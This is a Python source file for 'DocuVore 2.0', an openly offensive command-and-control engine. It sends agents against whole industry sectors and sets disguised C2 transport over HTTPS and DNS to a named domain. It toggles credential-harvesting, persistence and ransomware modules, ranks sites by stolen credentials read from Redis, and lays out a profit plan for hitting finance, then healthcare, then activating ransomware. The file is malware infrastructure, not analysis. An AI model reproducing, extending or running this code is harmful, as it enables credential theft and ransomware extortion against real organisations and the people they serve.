"""
C2 Engine Core - DocuVore 2.0 Body
Orchestrates server, agents, and PDF exploits
"""

import json
import os
from datetime import datetime
from typing import Optional, Dict, List
import aiofiles
from aiofiles import open as aopen

# Import from existing C2 server
from src.c2_server.server import C2Server

class C2Engine:
    """
    DocuVore 2.0 Core Engine
    The "Body" that executes Brain commands
    """
    
    def __init__(self, data_path: str = "./c2_data"):
        self.data_path = data_path
        self.server = C2Server(host="0.0.0.0", port=8000)
        self.modules = {
            'harvester': True,
            'c2_client': True,
            'persistence': True,
            'ransomware': False,
            'dns_tunnel': False,
            'soul_engineering': False,
        }
        self.transport = {
            'primary': 'https',
            'fallbacks': ['http', 'dns'],
            'dns_domain': 'leviathan-c2.net',
            'dns_subdomain': 'beacon',
            'http_prefix': 'https://google.com',
            'http_suffix': 'images/netflix.com',
        }
    
    async def initialize(self):
        """Initialize C2 engine and server."""
        print("\n" + "="*60)
        print("💻 DOCUVORE 2.0 CORE ENGINE INITIALIZING...")
        print("="*60)
        
        await self.server.initialize()
        
        print(f"   • Modules Loaded:")
        for module, enabled in self.modules.items():
            status = "✅" if enabled else "⏸️"
            print(f"     [{status}] {module}")
        
        print(f"   • Transport Config:")
        print(f"     Primary: {self.transport['primary']}")
        print(f"     Fallbacks: {', '.join(self.transport['fallbacks'])}")
        print(f"     DNS Domain: {self.transport['dns_domain']}")
        print("="*60 + "\n")
        
        return self
    
    async def close(self):
        """Close C2 engine."""
        await self.server.disconnect_redis()

    # === Brain Command Handlers ===
    
    async def on_deploy_target(self, industry: str, agents: int = 50) -> Dict:
        """Deploy agents against target industry."""
        print(f"🎯 Deploying {agents} agents against {industry} sector...")
        
        # Create beacon WebSocket connections
        nodes = []
        for i in range(agents):
            node = await self.server.create_node(f"docu_{industry}_{i}")
            nodes.append(node)
        
        print(f"✅ Created {len(nodes)} active nodes")
        
        # Broadcast deployment config
        await self.server.broadcast('config', {
            'type': 'deployment',
            'industry': industry,
            'nodes': len(nodes),
        })
        
        return {
            'status': 'deployed',
            'industry': industry,
            'nodes_created': len(nodes),
            'c2_url': self.server.c2_url,
        }
    
    async def on_modify_transport(self, config: Dict) -> Dict:
        """Modify C2 transport configuration."""
        print(f"📡 Updating transport to: {config}")
        
        self.transport.update(config)
        
        # Broadcast to all connected agents
        await self.server.broadcast('config', {
            'type': 'transport',
            'config': config,
        })
        
        return {
            'status': 'transport_updated',
            'new_config': config,
        }
    
    async def on_activate_module(self, module: str, enabled: bool) -> Dict:
        """Activate/deactivate C2 module."""
        print(f"🔧 Toggling module '{module}': {'ON' if enabled else 'OFF'}")
        
        self.modules[module] = enabled
        
        # Broadcast module state
        await self.server.broadcast('config', {
            'type': 'modules',
            'modules': self.modules,
        })
        
        return {
            'status': 'module_toggled',
            'module': module,
            'enabled': enabled,
        }
    
    async def on_analyze_state(self) -> Dict:
        """Analyze current C2 state."""
        nodes = await self.server.get_all_nodes()
        
        active_count = sum(1 for n in nodes if n.get('status') == 'active')
        total_bytes = sum(
            n.get('bytes_harvested', 0) 
            for n in nodes if n.get('status') == 'active'
        )
        
        return {
            'status': 'analyzed',
            'summary': f"Total: {len(nodes)} nodes, Active: {active_count}",
            'total_bytes_harvested': total_bytes,
            'total_agents': len(nodes),
        }
    
    async def on_report(self) -> Dict:
        """Generate status report."""
        nodes = await self.server.get_all_nodes()
        
        # Get top 10 most active nodes
        active_nodes = [n for n in nodes if n.get('status') == 'active'][:10]
        top_harvested = sorted(active_nodes, key=lambda x: x.get('bytes_harvested', 0), reverse=True)[:5]
        
        # Get top harvested sites
        top_sites = await self._get_top_sites()
        
        return {
            'status': 'report_generated',
            'summary': f"Total: {len(nodes)} nodes, Active: {len(active_nodes)}",
            'top_harvested': top_harvested[:3],
            'top_sites': top_sites[:5] if top_sites else [],
        }
    
    async def on_strategic_plan(self) -> Dict:
        """Generate strategic profit plan."""
        nodes = await self.server.get_all_nodes()
        active = sum(1 for n in nodes if n.get('status') == 'active')
        total_bytes = sum(n.get('bytes_harvested', 0) for n in nodes)
        
        # Calculate ROI estimates
        roi_estimates = [
            {'phase': 1, 'name': 'Finance Sector Dominance', 'nodes': 50, 'est_time': '24h', 'est_profit': 50000},
            {'phase': 2, 'name': 'Healthcare Expansion', 'nodes': 30, 'est_time': '48h', 'est_profit': 100000},
            {'phase': 3, 'name': 'Ransomware Activation', 'nodes': active * 0.5, 'est_time': '72h', 'est_profit': 125000},
        ]
        
        return {
            'status': 'plan_generated',
            'current_state': f"{active} active agents, {total_bytes/1024/1024:.2f}MB harvested",
            'roi_estimates': roi_estimates,
            'recommended_action': 'Deploy to finance sector if <20 agents active',
        }
    
    # === Helper Methods ===
    
    async def _get_top_sites(self) -> List[Dict]:
        """Get top harvested sites from Redis."""
        try:
            import redis
            redis_url = self.server.redis_url
            redis_conn = redis.from_url(redis_url, db=0, decode_responses=True)
            
            keys = redis_conn.keys("cred:*")
            sites = []
            
            for key in keys[:50]:
                cred = redis_conn.get(key)
                if cred:
                    import json
                    data = json.loads(cred)
                    site = data.get('site', 'Unknown')
                    sites.append({
                        'site': site,
                        'count': sites.count(site) if site else 1,
                    })
            
            return sites
        except Exception as e:
            print(f"⚠️  Site analysis error: {e}")
            return []

    async def broadcast_config(self, config_type: str, data: Dict):
        """Broadcast configuration to all connected agents."""
        await self.server.broadcast('config', {
            'type': config_type,
            'data': data,
        })